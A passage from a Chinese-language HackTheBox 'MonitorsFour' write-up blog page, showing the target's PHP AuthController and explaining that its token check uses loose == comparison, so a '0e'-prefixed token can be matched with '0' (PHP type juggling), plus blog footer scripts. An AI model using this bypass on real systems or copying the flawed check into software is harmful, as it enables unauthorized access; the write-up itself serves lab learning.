class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">            <span class="variable">$user</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$user</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;No user found by that ID&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;No user found by that ID&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$user</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+              </div>
+            </details>
+
+<details class="green" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>AuthController.php (点击展开查看源码) </summary>
+              <div class='content'>
+              <div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="title class_">Database</span>::<span class="title function_ invoke__">getInstance</span>()-&gt;<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validate_token</span>(<span class="params"><span class="variable">$token</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$query</span> = <span class="string">&quot;SELECT token FROM users&quot;</span>;</span><br><span class="line">        <span class="variable">$stmt</span>  = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line">        <span class="variable">$tokens</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_COLUMN</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$tokens</span> <span class="keyword">as</span> <span class="variable">$db_token</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$token</span> == <span class="variable">$db_token</span>) &#123;<span class="comment">//若比较检测</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+              </div>
+            </details>
+
+
+  <div class="note-large orange">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <i class="notel-icon fa-solid fa-graduation-cap"></i><p>弱类型比较</p>
+
+    </div>
+    <div class="notel-content">
+      <p>可以看到 token 是用 <code>==</code> 弱比较检测的，<code>0e</code> 开头的和 <code>0</code> 进行弱比较的话会返回 <code>True</code>，数据库中恰好 token 是 <code>0e</code> 开头的。</p>
+
+    </div>
+  </div>
+
+<h3 id="6-Todo"><a href="#6-Todo" class="headerlink" title="6. Todo"></a>6. Todo</h3><p>第一次在打靶中使用 sliver，发现好多操作我都还不会，后面会去看一下 sliver 的官方 wiki 补全一下知识弱点。</p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> HTB - MonitorsFour Writeup</li>
+        <li><strong>Author:</strong> EnchanterW</li>
+        <li><strong>Created at
+                :</strong> 2025-12-13 03:40:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-12-13 03:14:04
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://enchanter-w.github.io/2025/12/13/HTB_monitorsfour/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/HTB/">#HTB</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Windows/">#Windows</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/WSL2/">#WSL2</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Docker/">#Docker</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Cacti/">#Cacti</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/PHP-Type-Juggling/">#PHP Type Juggling</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/11/21/HTB_eighteen/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">HTB - Eighteen Writeup</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="giscus-container"></div>
+    <script data-swup-reload-script defer>
+        async function loadGiscus() {
+            const giscusConfig = {
+                'src': 'https://giscus.app/client.js',
+                'data-repo': 'Enchanter-W/giscus_comment',
+                'data-repo-id': 'R_kgDOPzpiow',
+                'data-category': 'Announcements',
+                'data-category-id': 'DIC_kwDOPzpio84CvroL',
+                'data-mapping': 'pathname',
+                'data-strict': '0',
+                'data-reactions-enabled': '1',
+                'data-emit-metadata': '1',
+                'data-theme': 'preferred_color_scheme',
+                'data-lang': 'zh-CN',
+                'data-input-position': 'top',
+                'data-loading': 'lazy',
+                'crossorigin': 'anonymous',
+                'async': true
+            }
+            const giscusScript = document.createElement('script');
+            for (const key in giscusConfig) {
+                giscusScript.setAttribute(key, giscusConfig[key]);
+            }
+            document.getElementById('giscus-container').appendChild(giscusScript);
+        }
+        if ('true') {
+            let loadGiscusTimeout = setTimeout(() => {
+                loadGiscus();
+                clearTimeout(loadGiscusTimeout);
+            }, 1000);
+        } else {
+            document.addEventListener('DOMContentLoaded', loadGiscus);
+        }
+    </script>
+
+
+        
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">HTB - MonitorsFour Writeup</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#HTB-MonitorsFour-Writeup"><span class="nav-text">[HTB-MonitorsFour] Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Reconnaissance-%E6%89%AB%E6%8F%8F"><span class="nav-text">1. Reconnaissance (扫描)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Enumeration-%E6%9C%8D%E5%8A%A1%E6%9E%9A%E4%B8%BE"><span class="nav-text">2. Enumeration (服务枚举)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Initial-Foothold-%E8%8E%B7%E5%8F%96%E7%AB%8B%E8%B6%B3%E7%82%B9"><span class="nav-text">3. Initial Foothold (获取立足点)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Privilege-Escalation-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">4. Privilege Escalation (权限提升)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-More-on-this-box-%E6%8C%81%E4%B9%85%E5%8C%96%E4%B8%8E%E5%88%86%E6%9E%90"><span class="nav-text">5. More on this box (持久化与分析)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-Todo"><span class="nav-text">6. Todo</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">EnchanterW</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        18 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
